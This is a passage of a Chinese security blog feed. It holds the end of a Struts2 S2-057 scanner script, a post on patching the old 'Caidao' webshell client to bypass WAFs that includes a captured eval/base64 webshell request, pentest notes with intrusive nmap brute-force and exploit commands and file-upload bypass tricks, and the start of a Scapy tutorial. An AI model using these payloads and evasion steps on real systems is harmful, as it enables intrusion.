reqt=requests.get(url=urls,headers=headers,timeout=10)        if &#39;{}/struts2-showcase/struts2-showcase/222/register2.action&#39;.format(url) == reqt.url: //判断是否等于相加的结果            print(&#39;[+]st-057 url:{}&#39;.format(reqt.url))            print(&#39;[+]st-057 url:{}&#39;.format(reqt.url),file=open(&#39;save.txt&#39;,&#39;a&#39;))        else:            print(&#39;[-]Not st-057 url:{}&#39;.format(reqt.url))    except Exception as e:        print(&#39;[-]Error {}&#39;.format(e))if __name__ == &#39;__main__&#39;:    while True:        user=input(&#39;url.txt:&#39;)        if os.path.exists(user):            print(&#39;[+]{} existence&#39;.format(user))            break        else:            print(&#39;[-]Not existence {}&#39;.format(user))            continue    dk=open(&#39;{}&#39;.format(user),&#39;r&#39;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&#39;\n&#39;))        t=threading.Thread(target=scan,args=(qc,))        t.start()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/x4A6ilJ.png" alt=""></p><p>转载请注明来自:422926799.github.io<br>欢迎加入即刻安全交流群：307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bypass菜刀进化成过Waf刀</title>
      <link href="/posts/ec776b6d.html"/>
      <url>/posts/ec776b6d.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先我要在这里大肆吐槽，今天的底层软件好像都在刁难我。首先是用UPX脱壳工具<br>把菜刀脱坏掉了，然后重新下一个。在换一个脱没毛病，用C32asm进行字符替换的时候不给我替换。我特么。。。后面还是用Hxdx64进行替换的，我也是醉了。</p><p><img src="https://i.imgur.com/rPw2ac5.jpg" alt=""></p><pre><code>正式进入贪婪之岛篇！</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><pre><code>bypass菜刀教程：https://github.com/admintony/BypassCaiDao</code></pre><p>首先你要有把2010年的菜刀，因为16年的菜刀的数据包不同，然后你还需要一些底层工具。</p><pre><code>2010菜刀：链接: https://pan.baidu.com/s/1jvECLJjpsh4OsclZFHkv8g 密码: 6n1h吾爱破解工具包：链接：https://pan.baidu.com/s/1nwJg0eX  密码: iuj3WSExplorer抓包工具：https://blog.mycike.com/154.html</code></pre><p>我们首先把菜刀的UPX壳给脱了，这里我就不说了。自己脱掉就行<br><img src="https://i.imgur.com/m4Tcb1Z.png" alt=""><br>脱壳：</p><p><img src="https://i.imgur.com/993lYUE.png" alt=""></p><p>然后我们启动WSExplorer抓包工具，选择菜刀想进程进行抓包（用菜刀连shell）<br><img src="https://i.imgur.com/FxN5FLd.png" alt=""><br>然后我们可以看到图上抓到的包</p><pre><code>x=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7</code></pre><p>这里引用文章的解释：</p><pre><code>x 是shell的密码，其中的数据是让shell再接收一个z0z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并试用base64加密数据.</code></pre><p>然后文章把User-Agent头也改了，这里我就不改了。因为我获取了文件偏移地址但不会转为内存偏移地址（手动滑稽）</p><p>我们直接修改第一个参数数据：<br>首先用C32asm搜索：@eval(base64_decode($<em>POST[z0])); 替换成Dizep,fewi:8chigshi,(cTSWX</em>~4a–?（我这里的C32asm刁难我）<br><img src="https://i.imgur.com/67Pzx2W.png" alt=""><br>用HxDx64来替换<br><img src="https://i.imgur.com/dvYLN4b.jpg" alt=""><br>然后找一个有waf的站来测试，就用我之前过安全狗文件上传的那个站吧<br><img src="https://i.imgur.com/801VXaI.png" alt=""><br>（如果用普通的刀和一句话连的话和上图一样）<br><img src="https://i.imgur.com/eqR09oE.png" alt=""><br>转载请注明转自：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试信息笔记</title>
      <link href="/posts/c6a4e558.html"/>
      <url>/posts/c6a4e558.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>暑假快过完了，剩下的日子也没有多少。假期也写了不少脚本还有一个<br>CMS_DEBUG的脚本没用写完。里面集合比较多的CMS漏洞插件，测试过<br>都能用的。假期也拿了10几个shelll，虽然都提不了权限（滑稽）<br>总结一下假期所学到的东西。<br><img src="https://i.imgur.com/cCcSqID.jpg" alt=""></p><pre><code>重要的日历缺了一部份，被遗忘的月份将会被盛大地吊唁。在身着丧服的乐团演奏之下，农历十一月的月亮安稳地运行着。菊花与叶片一同枯萎凋零，躺卧在沾血的火红之眼旁边。就算剩下的伙伴只有一半，你的优越地位依然屹立不倒。享受这幕间休息时间吧，去找新伙伴也行。出发时可往东去，一定会遇到等待你的人</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p><strong>信息收集:</strong><br>是渗透测试的第一部分也是最重要的一部分。信息收集的大小决定挖出的漏洞，与漏洞的高危。<br><strong>一、web指纹与网站信息的收集：</strong></p><pre><code>爱站网进行SEO综合信息收集whatweb指纹收集 //whatweb -v 域名云悉进行CMS指纹识别判断网站是否有CDN,查询网站真实IPGoogle Hacking技巧nc抓网站指纹一些浏览器的插件可以识别web程序的指纹Zoomye与shodan进行搜索</code></pre><p><strong>二、路径探测与敏感信息泄露</strong></p><pre><code>敏感信息泄露/.robots.txt //通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。由于这样让我们知道了网站的一些敏感文件/.git //所有该项目的源代码,私有仓库的地址,私密的配置信息,所有commiter的邮箱帐号信息,(可能)内部的帐号和密码/.svn //所有该项目的源代码,svn仓库的地址,svn仓库所属用户的用户名/.hg //项目源代码,项目仓库地址,(可能)仓库的用户名,其他/.bzr //源代码,仓库地址,开发者的信息/.cvs //因为是纯客户端的工具, 所以只会泄露源代码备份文件泄露，如vim的/.swpWEB-INF目录泄露 //在Java的Servlet 文档中,说到WEB-INF目录&quot;包含了所有web应用会用到但是不处于web路径中的资源&quot;, 也就是说, WEB-INF目录下的内容是不属于公开页面的.web应用可以通过getResource等API在servlet的上下文中访问到这些资源.通常开发者会把许多JSP文件,Jar包,Java的类文件放在该目录下. 一般目录的内容都是可以预测的:WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)配置文件泄露配置错误导致的泄露敏感的信息存在于源码之中 //通过F12浏览现在许多网站都会存放一些敏感信息，比如学校的教务处系统就会上传一些和学生信息，如果这些 word 文件没有设置好相关权限，在网上搜索就可以搜索到相关敏感录访问文件相关网址也可以访问到相关文档。所以包含以下几点注意信息： 每个文件和文件夹权限必须设置。 一些相关敏感文档要及时清理，防止泄露。或者不包含敏感信息。 防止浏览进行下载敏感文件后缀 .zip，.tar，.gz，.tgz，.rar，... :(压缩）归档文件 .java：没有理由提供对 Java 源文件的访问 .txt：文本文件 .pdf：PDF 文档 .doc，.rtf，.xls，.ppt，...：Office 文档 .bak，.old 和其他指示备份文件的扩展（例如：〜用于 Emacs 备份文件）更多信息，请查看链接: http://filext.com/路径探测与敏感信息泄露利用工具通过brupsuite的Spider功能进行爬虫dirb进行路径探测dirbuster一些其他自动化进行路径探测的工具nikto -h http://xxx.com</code></pre><p><strong>三、web服务枚举</strong></p><pre><code>whois信息收集DNS信息收集子域名查询旁站查询端口扫描C段扫描dns域传输漏洞网站敏感目录 网站泄露的目录 查看HTML有没有有用的注释收集管理员邮箱 网站后台 一些工具的用法(首先通过判断目标存在扫描服务用适当的脚本进行检测)：nmap命令：nmap -sV IP    nmap -p 1-65535 IPnmap -A IPnmap --script=vuln IPnmap --max-parallelism 800--script http-slowloris IP //检测http服务拒绝nmap -p 8080 --script http-iis-short-name-brute IP //IIS 短文件泄露nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 IP //ftp弱口令暴力破解nmap -T3 --script http-methods --script-args http.test-all=true,http.url-path=IP //验证http中开启的-methods 方法nmap -sV --script http-vuln-cve2015-1635 IP //验证HTTP.sys 远程代码执行nmap -sV -p 443 --version-light --script ssl-poodle IP //验证 SSL POODLE information leaknmap --script http-put --script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt IP //验证http 中开启了put 方法nmap --script mysql-empty-password IP //验证mysql 匿名访问nmap -v -v --script ssl-cert IP //验证ssl-cert证书问题nmap -Pn --script ssl-date IP //验证SSL证书的有限期nmap -p 443 --script ssl-known-key IP //验证 Debian OpenSSL keysnmap --script ssl-enum-ciphers IP //验证弱加密SSL套件nmap IP --vv --script sshv1,ssl-ccs-injection,ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,sslv2 //验证多种SSL漏洞问题nmap --script sniffer-detect IP //在网络中检测某主机是否存在窃听他人流量nmap -sV --script unusual-port IP //精准地确认端口上运行的服务nmap --script brute IP //使用nmap 对常见的服务进行暴力破解nmap --script exploit IP //使用nmap 利用已知的漏洞入侵系统nmap --script external IP //使用nmap 进行利用第三方的数据库或资源进行信息收集或者攻击nmap --script fuzzer IP //使用nmap 进行模糊测试，发送异常的包到目标机，探测出潜在漏洞 nmap --script intrusive IP //使用nmap 进行入侵，此类脚本可能引发对方的IDS/IPS的记录或屏蔽nmap --script malware IP //使用nmap 探测目标机是否感染了病毒、开启了后门等信息nmap --script safe IP //使用nmap 对系统进行安全检查nmap --script nmap-vulners,vulscan --script-argsvulscandb=scipvuldb.csv -sV //CVE漏洞扫描 详细方法：http://www.freebuf.com/sectool/161664.html    dnsenum命令：dnsenum 域名查询子域名：AQUATONE 用法：http://www.freebuf.com/sectool/137806.html子域名挖掘神器：https://pan.baidu.com/s/1dFJzIJR旁站查询：用一些在线的工具进行查询，如站长助手与爱站网之类的御剑有旁站查询和C段扫描的功能的版本C段扫描：whatweb --no-errors --url-prefix https:// 192.168.0.0/24</code></pre><p><strong>四、明确web程序入口点</strong></p><pre><code>HTTP 请求（request）：明确代码中哪一块使用的是 GET 传输，哪一块是 POST 传输。明确所有 HTTP 请求全部使用 POST 传输。（包括一些隐藏的参数 hidden）明确所有传输是 GET 提交的时候，要做好标记。明确哪些是查询字符串参数（说明白就是输入、输出）即使做了编码或加密，也要注意参数，在应用中做了哪些调用。HTTP 回复（response）：明确 header 返回哪些参数查看哪些目录返回是以 200、300、403 以及 500 返回，做好标记，都把他们重定向首页，防止其它页上面泄露不必要信息。一些注意点如下：可以使用 BurpSuite 工具，去查看一些隐藏</code></pre><p>做完以上的内容之后，做一个总结。</p><p><strong>漏洞挖掘</strong>：<br>做完信息收集之后就到了漏洞挖掘这一步，挖掘漏洞看了挺多大牛的文章。这里<br>我也做了几点总结。</p><pre><code>在做完信息收集这一步后，想必已经知道了中间件的版本信息之类的。我们可以利用searchsploit来寻找中间件的漏洞。如果知道CMS版本去搜Google搜一下这个版本或者这个CMS的漏洞如：dede_cms的远程写入漏洞。表单尝试弱口令，表单尝试逻辑漏洞，模糊登录测试 工具：cewl [options] www.example.comBurpsuite自动化的漏洞挖掘：Burp Scanner    自动化扫描安全漏洞的Burp Suite工具HTTP 安全方法测试:HTTP 方法主要应用在 Web 服务器上面，通过部署一些应用可以查看到一些相关的方法。HT议，最超见的传输有 GET、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT 传输方法，而 GET 是在 URL 可见的，相对不安全，风险高。显示的参数，风险低。常见的 HTTP 方法有 GET其中一些方法可能会对 Web 应用程序造成安全风险，因为它们允许攻击者修改存储在 Web 在某些情况下窃取合法的证书用户。 更具体地操作，应该禁用的方法如下： PUT：该方法允许客户端上传 Web 服务器上的新文件。 攻击者可以利用它通过上传恶意用 cmd.exe 执行命令的 asp 文件）或者通过简单地使用受害者服务器作为文件存储。 DELETE：此方法允许客户端删除 Web 服务器上的文件。 攻击者可以利用它作为一种非破坏网站或发起 DoS 攻击。 CONNECT：此方法可以允许客户端将 Web 服务器用作代理。 TRACE：这个方法简单地返回给客户端，不管字符串是否发送给客户端服务器，主要用 黑盒测试通过抓包软件查看一下服务器支持哪些 HTTP 协议般会在传输的头部加 OPTIOHTTP 传输加密安全测试 :HTTP 传输安全性（HSTS）标头是网站必须通信的一种机制。浏览器必须通过 https 发送。应对安全的重要措施，首先是要验证网站是否正在使用这种安全措施 HTTP 标头，以确保器传输到服务器。HTTP 严格传输安全性（HSTS）功能允许 Web 应用程序通过浏览器通知浏览器使用特殊立到指定域的连接使用 HTTP 的服务器。 相反，它应该自动建立所有访问该网站的连接请TP 在浏览器是以明文传输，这样会泄露一些重要信息，使用 https 加密传输，首先会符合过程中也会进行加密，防止信息在传输过程中泄密。HTTP 传输 header 严格按照两个指 max-age：浏览器应该自动从 HTTP 转换到 HTTPS 协议。 includeSubDomains：指示所有 Web 应用程序的子域名必须使用 HTTPS展示一个 HSTS 头实现的例子ict-Transport-Security: max-age=60000; includeSubDomains须检查 Web 应用程序使用上述 header，并查找是否可能产生以下安全问题：攻击者嗅探网络流量并访问通过未加密通道传输的Cross Domain 策略测试:RIA 是基于 Web 的服务，可以在浏览器去执行一些操作，和桌（例如 Java，Adobe Flash，Adobe）可以访问不同区域的数据。 对的 crossdomain.xml，并另外创建了它自己的跨域策略文件：clie跨域的时候，它都会首先查找目标域中的策略文件，用于确定是是允许的。主策略文件位于域的根目录。 客户端可能会被指示加载不同的主策略文件允许所请求的策略文件。 如何测试在 Web 的根目录去查找这两个文件，查看是否可以访问，clientaccesspolicy.xm角色定义测试 : 测试目标管理员的角色应该和其它应用角色分配清楚，管理员权限应该只设定管理人员管理，而应用管理的权限只能用来管理应用即可，两者不能混淆。 如何测试我们利用管理员的账号通抓包去修改一些相应的参数，查看是否可以看到应用管理员的一些相关信息。 现在，我有很多 WordPress 的网站，WordPress 的角色定义的例子可以在下面显示的链接中找到。 https://codex.wordpress.org/Roles_and_Capabilities 安全测试工具 BurpSuite 手工测试使用普通用户登录，在查看用户的同时，BRUP 已经把页面扫描了一遍，不仅可以查看面目，也可以进行扫描工具。BurpSuite 是一个非常强大的工具用户注册安全测试:测试目标验证用户注册的身份要求是否与业务和安全性保持一致验证一下用户注册过程如何测试测试列表 确定谁可以注册访问（任何人）？ 注册是否在供应之前由人工审查，或者如果注册是自动授予的 该标准得到满足。 同一个人是否可以多次注册？ 用户可以注册不同的角色或权限吗？ 注册成功需要什么样的身份证明？ 是否验证了注册身份？ 身份信息是否容易伪造或伪造？ 在注册过程中可以交换身份信息吗？测试工具 Manual test HTTP proxy (Burp Suite, ZA用户账户权限测试: 目标测试验证低权限用户是否可以去查看高权限用户的信息，或者低权限用户可以修改高用户的资料。 如何测试测试项 是否有一些验证，审核和授权的配置请求？ 是否有一些验证，审核和批准取消请求？ 管理员可以查看其它管理员信息吗，所谓平行越权？ 管理员或其他用户可以查看上级的用户信息吗？ 管理员或用户是否可以自行解除配置？权限配置是否可以删除一些个人信息，如果设置禁用，用户是否通过其它途径 利用工具：名称    描述Compare Site Maps    Burp的用于测试授权的模块这里有个小技巧，就是注册两个不同权限的用户，然后用高权限的用户去访问整个Web应用，退出高权限用户，登录低权限用户,然后用Burp的Compare Site Maps工具去测试哪些页面的权限控制没有做好。账户枚举和用户帐户猜解测试: 黑盒测试一般情况下，测试人员对目标的用户设施一点都不知道，也没有进行信息地显示一些用于枚举用户的信息。 HTTP 响应信息 测试正确的用户名和错误,看看是否会返回一些逻辑上的问题。如用户正确密码错误则返回密码错误，从找登陆，注册，回密码进行测试看看是否能发现用户一些敏感信息。HTTP 数据传输认证测试：看看是否有未加密的信息在传输或者使用GET请求HTTP 默认认证测试：测试一些有共同测试点的信息 测试一些默认的用户：admin, administrator, root, system, guest, operator, superuser。在源代码里面查看是否有一些注释写着用户名和，检查一下配置文件，里面会涉及到用户名和密码，暴力破解锁定测试：简述户锁定机制用于缓解暴力密码猜测攻击。 通常在 3 到 5 次间段后，通过自助服务解锁机制或管理员干设置才能解锁。 止用户被拒绝授权访问之间取得平衡。目标对象评估帐户锁定机制减轻暴力密码猜测的能力评估解锁机制对未授权帐户解锁的绕过认证协议测试：当应用程序根据固定值参数验证成功登录时用户可以修改这些参数可以访问而无需提供有效的sql注入测试：注意网站的URL有id=?都拿到SQLMAP测试一遍或者手测，表单进行单和双引号进行测试与手测，用burpsuite抓表单提交的包扔SQLMAP跑，网站有调用数据库的地方都测试一遍，API接口测试SQL注入强制浏览如果： Web 应用程序仅在登录页面上实现访问控制，则可以绕过认证架绕过 SESSION 管理协议测试:主要攻击步骤如下： Cookies 收集：收集充足数量的 cookies 样本。 Cookie 逆向工程：分析 cookie 的生成算法。 Cookie 篡改：伪造一个有效的 cookie 来执行攻击。最后一步可能要求 大量的尝试，取决于 cookie 是如何被创造的(cookie 暴力破解攻COOKIE 会话漏洞测试： 测试 cookie 属性漏洞。通过使用一个拦截代理或者拦截浏览器插件，捕捉应用程序设置 cookie 值(set-cookie)的所有的响应包,并且检查下列内容： Secure 字段属性：当一个 cookie 包含了敏感信息或者一个 session token 时，这个 cookie 应该通过加密通道进行传输。举个例子：当登陆进一个应用并且使用 cookie 设置会话令牌(session token)后，应该使用“;secure”标志验证它是否被打上标记。如果 secure 没有被打上标记，浏览器会同意使用未加密的渠道来传递cookie 值：例如通过 http 协议。因此，攻击者可以诱导用户通过不安全的隧道提交他们的 cookie 值，从而导致信息的泄露。 HttpOnly 字段属性：这个属性应该一直被设置，即使并不是所有的浏览器都支持这个属性。这个属性可以避免 cookie 值被用户端脚本获得。这个属性无法消除跨站脚本攻击但是能消除一些危险的攻击。所以，记得检查是否 httpOnly 标签被设置了。 domain 字段属性：验证域名是否设置的太宽松。这个属性只应该为需要接收 cookie 的服务器设置。举个例子，如果应用驻留在服务器 app.mysite.com 上，那么 domain 属性应该为&quot;domain=app.mysite.com&quot;而不是“domain=.mysite.com&quot;. 因为后者可能会允许潜在的易受攻击的服务器接收到 cookie 值。 Path 字段属性： 认证路径属性，就像 domain 属性所介绍的一样，不能被设置的太过松散。即使 domain字段属性已经被设置的尽可能的安全紧凑，如果 path 属性被设置在根目录’/’下，其他一些运行在同一个服务器下的不安全的应用也可能会受到攻击。举个例子：如果一个应用运行在/myapp/目录下，其 cookie路径应该设置为“;path = /myapp/“而不是”;path= /”或“;path= /myapp”。注意到”/”应该紧跟在 myapp 的后面。如果不这样设置，浏览器将会发送 cookie 值给任何包含了”myapp” 例如”myapp-exploited”的路径。 Expires 字段属性：如果将此属性设置为将来的某个时间，则到期后该 cookie 值会失效。举个例子：如果一个 cookie 设置&quot;; expires=Sun, 31-Jul-2019 13:45:29 GMT&quot;而当前时间为 July 31st 2018，那么测试者就应该检查这个 cookie 值。如果这个 cookie 值是一个存储在用户硬盘中的会话令牌（session token），那么能访问这个 cookie 的攻击者或者本地的用户（例如 admin 用户）就能通过重新提交这个 token 值访问这个应用，直到这个 cookie 过期SESSION 固定攻击测试：当服务器端完成一次成功的用户认证后，如果一个应用不刷新用户的 session cookie 值，就有可能存在 SESSION定攻击漏洞。在这种情况下，攻击者可以迫使一个用户使用一个攻击者已知的cookie值，从而窃取用户的Session，现 session 劫持。ion 固定攻击漏洞发生的场景：一个 web 应用程序通过继续使用与用户关联的会话 ID 对用户进行身份验证，而不会首先使现存的会话 ID 无效。一个攻击者能够强制用户使用已知的会话 ID，以便在用户进行身份验证后，攻击者能够访问经过身份验证的会话。SQL注入：注意网站的URL有id=?都拿到SQLMAP测试一遍或者手测，表单进行单和双引号进行测试，用burpsuite抓表单提交的包扔SQLMAP跑，网站有调用数据库的地方都测试一遍，API接口测试SQL注入文件上传：能上传文件的地方就尝试进行挖掘。遇到拦截先看看服务器用什么配置的环境。例如是IIS6.0（IIS环境大部分都有文件上传漏洞可以百度发现）或Apache等等。。都可以百度看看有什么上传绕过。一般绕过方式为：后缀大小写绕过，文件类型绕过，双写后缀名绕过，请求特殊后缀绕过，图片木马合并上传，文件00截断绕过，截断攻击%和&amp;，web服务器环境配置寻找漏洞  例如：IIS6.0的解析漏洞1）前端JavaScript验证 （发现有只前端验证的话，手动写一个文件上传的html将action设置为判断文件即可。）例如：检测上传文件的是：upload.php 但是服务端没做判断，前端做了判断。&lt;form action=’http://xx/upload.php’ method=’post’&gt;&lt;input type=’file’ name=’file’ id=’file’&gt;&lt;br&gt;&lt;input type=’submit’ value=’提交’&gt;&lt;/form&gt;文件包含：注意url后面有include=xx.php,或tiao=xx.php，file=xxx.php，总之注意一下url。先判断远程包含或本地包含，可以远程包含直接Getshell即可。本地包含可以利用各种伪协议例如：php,data,zip等等。。或与文件上传漏洞一起利用。详细的利用手法：https://www.cnblogs.com/haq5201314/p/9248281.htmlnginx文件解析漏洞：找到一张图片后面加上/.php。如果返回乱码则出现该漏洞xss：利用web程序，插入了恶意javascript代码就是xss。xss分为三种：反射型xss，存储型xss，DOM型xss。在能输入的地方插入xss payload代码进行测试xml注入（XXE）：当Web应用的XML解析器没有正确的验证攻击者传入的XML文档，就会发生XML注入。 xml注入漏洞：https://www.cnblogs.com/xiaozi/p/5785165.html模板注入：模板注入就是攻击者利用模板的语法注入恶意代码。教程：http://www.cnblogs.com/wfzWebSecuity/p/9415641.html命令注入：用户注入操作系统的命令到Web应用程序并被执行，就发生了命令注入。 教程：https://www.cnblogs.com/enderzhou/p/6836678.html恶意重定向：当应用没有对用户输入的URL进行检查就造成了恶意重定向。测试方法：对一些请求名加入URL看看是否会跳转</code></pre><p><strong>一些后渗透的学习：</strong><br>前面也说了，拿到了shell嘛虽然处于提不了权的尴尬地位。但是还是有一些学习滴（滑稽智商产出99+）</p><p>windows方面的提权用到的命令（这里懒得打命令，直接放url（滑稽x3））：</p><pre><code>有关windows提权说明：http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html假期写的windows提权辅助脚本：https://github.com/422926799/python/blob/master/windows_collect.py</code></pre><p>Linux方面提权用到的命令：</p><pre><code>利用Linux的path环境进行提权https://mp.weixin.qq.com/s?__biz=MzIyMDEzMTA2MQ==&amp;mid=2651149779&amp;idx=1&amp;sn=cfb63bb2ac725e017c619a449e6a53ee&amp;chksm=8c214e49bb56c75f7a6b41da63f4fdf7c8ee5269fce11e82cf853342af03a9ff72c862e1764c&amp;mpshare=1&amp;scene=23&amp;srcid=0712tJEadbXElVmSvoLVgkAE#rd从NTDS.dit获取密码hash的三种方法http://www.freebuf.com/sectool/176876.htmlLinux提权：https://guif.re/linuxeop假期写的Linux提权赋值脚本：https://github.com/422926799/python/blob/master/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC/informationgathering.py</code></pre><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>现实中提权并不可能那么顺利，那么就要靠大家搜索一些奇淫技巧了。到时候我会写的。就在刚刚手贱把下了6.5GMac镜像删除了。。。。<br>(如果要学习好渗透的话，自己所画的学习图是不可少的)<br>例如:<br><img src="https://i.imgur.com/Tzw5jOh.png" alt=""></p><p>好了，这里就到此为止。转载请注明：422926799.github.io 九世的博客<br>欢迎加入即刻安全技术交流群：307283889</p><pre><code>重要的记忆缺少了一个人，在梦中你的出现，勾勒起遗忘的过去......</code></pre>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scapy的认识</title>
      <link href="/posts/9f93464c.html"/>
      <url>/posts/9f93464c.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送它们，捕获它们，匹配请求和回复等等。它可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现（它可以取代hping，85％的nmap，arpspoof，arp-sk，arping，tcpdump，tethereal，p0f等）。它还能在许多其他工具无法处理的其他特定任务中表现良好，例如发送无效帧，注入自己的802.11帧，组合技术（VLAN跳跃+ ARP缓存中毒，WEP加密通道上的VOIP解码，…… ）等</p><p><img src="https://i.imgur.com/PhZuxdD.jpg" alt=""></p><h2 id="scapy的基础使用"><a href="#scapy的基础使用" class="headerlink" title="scapy的基础使用"></a>scapy的基础使用</h2><p>scapy的安装方法：</p><pre><code>Linux安装方法：sudo apt-get install scapypip install scapywindows的安装方法：pip install scapyMac的安装方法：pip install scapy</code></pre><p>安装完成之后在终端执行sudo scapy可以见到如下图：<br><img src="https://i.imgur.com/UdSxoff.png" alt=""><br>(当然那个banner也有可能没有出现)<br>框架包的引入</p><pre><code>from scapy.all import *</code></pre><p>查看配置信息：</p><pre><code>from scapy.all import *printf(conf)</code></pre><p><img src="https://i.imgur.com/zsWHhuY.png" alt=""><br>配置信息：</p><pre><code>ASN1_default_codec = &lt;ASN1Codec BER[1]&gt;AS_resolver = &lt;scapy.as_resolvers.AS_resolver_multi object at 0x7fae78a43b70&gt;BTsocket   = &lt;BluetoothRFCommSocket: read/write packets on a connected L2CAP...L2listen   = &lt;L2ListenSocket: read packets at layer 2 using Linux PF_PACKET ...L2socket   = &lt;L2Socket: read/write packets at layer 2 using Linux PF_PACKET ...L3socket   = &lt;L3PacketSocket: read/write packets at layer 3 using Linux PF_P...auto_crop_tables = Trueauto_fragment = 1cache_iflist = {}cache_ipaddrs = {}checkIPID  = 0checkIPaddr = 1checkIPinIP = TruecheckIPsrc = 1check_TCPerror_seqack = 0color_theme = &lt;NoTheme&gt;commands   = IPID_count : Identify IP id values classes in a list of packets...contribs   = {}crypto_valid = Falsecrypto_valid_advanced = Falsedebug_dissector = 0debug_match = 0debug_tls  = 0default_l2 = &lt;class &#39;scapy.packet.Raw&#39;&gt;emph       = &lt;Emphasize []&gt;ethertypes = &lt;/etc/ethertypes/ n_802_AD n_802_1AE&gt;except_filter = &#39;&#39;extensions_paths = &#39;.&#39;fancy_prompt = Truegeoip_city = Nonehistfile   = &#39;/home/nineworld/.scapy_history&#39;iface      = &#39;ens33&#39;iface6     = &#39;lo&#39;interactive = Falseinteractive_shell = &#39;&#39;ipv6_enabled = Truel2types    = 0x0 -&gt; Loopback (Loopback) 0x1 &lt;- Dot3 (802.3) 0x1 &lt;-&gt; Ether (E...l3types    = 0x3 -&gt; IP (IP) 0x800 &lt;-&gt; IP (IP) 0x806 &lt;-&gt; ARP (ARP) 0x86dd &lt;-&gt;...layers     = Packet : &lt;member &#39;name&#39; of &#39;Packet&#39; objects&gt; NoPayload : &lt;membe...load_layers = [&#39;l2&#39;, &#39;inet&#39;, &#39;dhcp&#39;, &#39;dns&#39;, &#39;dot11&#39;, &#39;gprs&#39;, &#39;hsrp&#39;, &#39;inet6&#39;...logLevel   = 30manufdb    = &lt;00:50:C2:AF:C0:00/36 OdusTech, Odus Technologies SA&gt; &lt;00:50:C2...mib        = &lt;MIB/ prime192v2 EV_T_Telessec_GlobalRoot_Class_3 pkcs_9_sx bas...min_pkt_size = 60neighbor   = Ether -&gt; IPv6 Ether -&gt; LLC Ether -&gt; ARP Dot3 -&gt; LLC Ether -&gt; Do...netcache   = arp_cache: 0 valid items. Timeout=120s in6_neighbor: 0 valid it...noenum     = &lt;Resolve []&gt;padding    = 1padding_layer = &lt;class &#39;scapy.packet.Padding&#39;&gt;prog       = display = &#39;display&#39; dot = &#39;dot&#39; hexedit = &#39;hexer&#39; ifconfig = &#39;i...promisc    = 1prompt     = &#39;&gt;&gt;&gt; &#39;protocols  = &lt;/etc/protocols/ dccp rohc ospf eigrp xns_idp ax_25 rspf ipip i...raw_layer  = &lt;class &#39;scapy.packet.Raw&#39;&gt;raw_summary = Falseresolve    = &lt;Resolve []&gt;route      = Network Netmask Gateway Iface Output IP Metric 0.0.0.0 0.0.0.0 ...route6     = Destination Next Hop Iface Src candidates Metric fe80::/64 :: e...services_tcp = &lt;/etc/services-tcp/ fax remoteping cvspserver sane_port sge_q...services_udp = &lt;/etc/services-udp/ sge_qmaster venus imap2 gopher omirr rtsp...session    = &#39;&#39;sniff_promisc = 1stats_classic_protocols = [&lt;class &#39;scapy.layers.inet.TCP&#39;&gt;, &lt;class &#39;scapy.la...stats_dot11_protocols = [&lt;class &#39;scapy.layers.inet.TCP&#39;&gt;, &lt;class &#39;scapy.laye...stealth    = &#39;not implemented&#39;temp_files = []teredoPrefix = &#39;2001::&#39;teredoServerPort = 3544use_bpf    = Falseuse_dnet   = Falseuse_npcap  = Falseuse_pcap   = Falseuse_pypy   = Falseuse_winpcapy = Falseverb       = 2version    = &#39;2.4.0&#39;warning_threshold = 5wepkey     = &#39;&#39;</code></pre><p>查看scapy支持的协议</p><pre><code>from scapy.all import *print(ls())</code></pre><p><img src="https://i.imgur.com/TxOYQXi.png" alt=""></p><pre><code>    AH         : AH    ARP        : ARP    ASN1P_INTEGER : None    ASN1P_OID  : None    ASN1P_PRIVSEQ : None    ASN1_Packet : None    ATT_Error_Response : 